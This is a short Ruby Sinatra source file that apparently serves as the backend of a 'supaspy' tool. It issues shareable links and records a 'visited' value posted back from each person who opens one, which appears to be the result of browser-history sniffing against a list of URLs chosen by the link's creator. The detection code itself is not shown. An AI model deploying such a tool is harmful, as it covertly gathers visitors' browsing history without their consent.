require 'erb'
require 'dm_models.rb'


def supaspy_link(combined_keys)
  "http://#{request.host}#{request.port != 80 ? ":#{request.port}" : "" }/play/#{combined_keys}"
end

get '/' do
  erb :index
end

post '/create' do

  urlset = Urlset.new({
    :mail => params[:mail],
    :urls => params[:urls]
  })

  urlset.save
  #urlset.send

  @supaspy_link       = supaspy_link( urlset.combined_keys )
  @supaspy_link_short = 'http://goo.gl/Fak3'
  #@supaspy_link_short = Google::UrlShortener.shorten!(@supaspy_link)

  erb :created, :layout => false

end

get '/play/:combined_keys' do
  if Urlset.find_by_combined_keys(params[:combined_keys]).nil?
    'key not found'
  end
  erb :play, :layout => false
end

get '/spy/:combined_keys' do
  @urlset = Urlset.find_by_combined_keys(params[:combined_keys])
  erb :spy, :layout => false
end

post '/spy/:combined_keys' do
  urlset = Urlset.find_by_combined_keys(params[:combined_keys])
  unless urlset.nil?
    if urlset.checks.count < 5
      check = urlset.checks.new({ :visited => params[:visited] })
      check.save
      #check.send_mail
    end
  end
end

get '/stylesheet.css' do
  scss :stylesheet
end

